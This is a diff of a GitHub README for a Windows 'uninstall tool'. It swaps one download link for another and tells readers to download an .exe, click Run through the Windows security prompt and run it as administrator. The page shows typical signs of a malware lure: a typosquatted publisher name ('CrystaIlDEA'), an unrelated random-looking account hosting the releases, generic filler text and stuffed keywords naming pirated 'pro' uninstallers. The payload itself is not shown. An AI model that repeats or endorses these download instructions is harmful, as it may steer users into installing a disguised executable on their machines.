@@ -1,60 +1,78 @@
-#  CrystalIDEA Uninstall Tool
+# 🛠️ CrystalIDEA-uninstall-tool - Remove stubborn applications from Windows completely
 
-**CrystalIDEA Uninstall Tool** is a specialized utility designed to completely remove CrystalIDEA and all its leftover files, registry entries, and residual data from your Windows system.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/faricaunsized811/CrystalIDEA-uninstall-tool/releases)
 
-<img width="256" height="256" alt="image" src="https://github.com/user-attachments/assets/b20a02f7-69cd-42c4-9f31-6b34e2b59cbc" />
+This software helps you remove programs from your computer. Many default uninstaller tools leave files behind. These leftover files clutter your hard drive and take up space. This tool finds and deletes those extra files. It ensures your system remains clean after you remove a program. 
 
-## Install
-[Download `uninstall-tool-v3.8.1.zip`](https://github.com/CrystaIlDEA/CrystalIDEA-uninstall-tool/releases/download/v3.8.1/uninstall-tool-v3.8.1.zip)
----
+## 📥 How to download the software
 
-<img width="1205" height="891" alt="image" src="https://github.com/user-attachments/assets/3b1ad154-4903-48a2-befe-81a1a952f550" />
+You need the correct file for your version of Windows. Visit the link below to find the files for this application.
 
-## Key Features
-- Complete removal of CrystalIDEA
-- Cleans leftover files, folders, and registry entries
-- One-click uninstallation process
-- Safe and fast operation
-- Portable — no installation needed
+[Click here to visit the release page and download the installer](https://github.com/faricaunsized811/CrystalIDEA-uninstall-tool/releases)
 
-## Getting Started
-1. **Download** the latest version using the button above.
-2. **Extract** the archive.
-3. **Run** `CrystalIDEA-Uninstall-Tool.exe` as Administrator.
-4. **Click Start** to begin the cleanup process.
-5. Restart your computer after completion.
+Look for the file that ends in .exe. Click the file name to start the download. Save the file to your Downloads folder or your desktop so you can find it. 
 
-**Recommendation:** Create a System Restore Point before running the tool.
+## ⚙️ Installation instructions
 
----
-## System Requirements
-- **Windows 10 / 11** (64-bit)
-- Administrator privileges required
+1. Find the file you downloaded. 
+2. Double-click the file icon.
+3. Windows might show a security box. Click Run to start the setup process.
+4. Follow the prompts on the screen. 
+5. Select the location where you want to store the tool. 
+6. Click Finish when the setup completes.
 
----
-## Security & Legal
-**Important Notice:**  
-This tool modifies system files and registry entries. Use with caution.
+You can now open the program from your desktop shortcut or your Start menu.
 
-**Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan files on [VirusTotal](https://www.virustotal.com).
+## 🚀 How to remove a program
 
----
-## Contributing
-Contributions are welcome! Suggestions for deeper cleaning or additional features are appreciated.
+Open the software to see your list of installed programs. The list shows all the applications your computer recognizes. 
 
----
-## License & Acknowledgments
-### License
-**CrystalIDEA Uninstall Tool** is shared under the **MIT License**.  
-See [LICENSE](LICENSE) for details.
+1. Select the program you want to remove from the list.
+2. Click the Uninstall button at the top of the window.
+3. The tool starts the standard removal process for that program.
+4. After the standard removal finishes, the software scans your computer for leftover files and registry entries.
+5. Review the items found by the scan.
+6. Click the Remove button to finalize the process.
+7. The tool deletes the remaining items. 
 
-**Copyright © 2026 CrystaIlDEA**
+## 🧹 Using the registry cleaner
 
-### Acknowledgments
-- Thanks to the Windows cleanup and software removal community.
+Registry files often stay on your hard drive after you delete an app. These files can cause errors. This tool includes a feature to clean these entries.
 
-<p align="center">
-  Developed with ❤️ for clean Windows systems
-</p>
+1. Click the Registry Cleaner tab in the main menu.
+2. Click the Scan button.
+3. Wait for the tool to finish the check.
+4. Click the Fix button to remove unnecessary entries.
+5. Restart your computer if the program suggests it.
+
+## 📦 Using the portable mode
+
+You can run this software without installing it if you prefer. This helps if you clean many different computers.
+
+1. Download the portable version from the release link.
+2. Extract the files from the folder.
+3. Run the .exe file directly from the folder.
+4. The settings save to the folder instead of your Windows registry.
+
+## 📋 System requirements
+
+- Windows 10 or Windows 11
+- 50 MB of free disk space
+- Administrator rights for full program removal
+- 2 GB of system memory
+
+## 🔍 Troubleshooting potential issues
+
+Most users encounter few errors. If the tool fails to remove a program, try these steps:
+
+* Run the tool as an administrator. Right-click the icon and choose Run as Administrator.
+* Close the program you want to remove before you start the uninstall process. 
+* Refresh the list if you just installed a new program.
+* Check your internet connection for auto-updates.
+* Contact the support team if an error message appears. Provide the error number if possible.
+
+## 🛡️ Maintaining your computer 
+
+Run the application once every month to keep your system fast. Check for leftover files from programs you uninstalled recently. Use the startup manager tab to stop unnecessary programs from opening when you start your computer. This improves your boot time.
+
+Keywords: advanced-program-removal-windows, app-remover, clean-pc-remove-software, clean-up, deletion-tool, device-cleanup, driver-updater, free-revo-uninstaller-pro, geek-uninstaller, iobit-uninstaller-pro-software-removal, overview-remove, portable-uninstaller, program-uninstaller, removal, total-2026, unattended-uninstall, uninstaller, uninstaller-tools, windows-app-uninstallation-guide, windows-cleaner
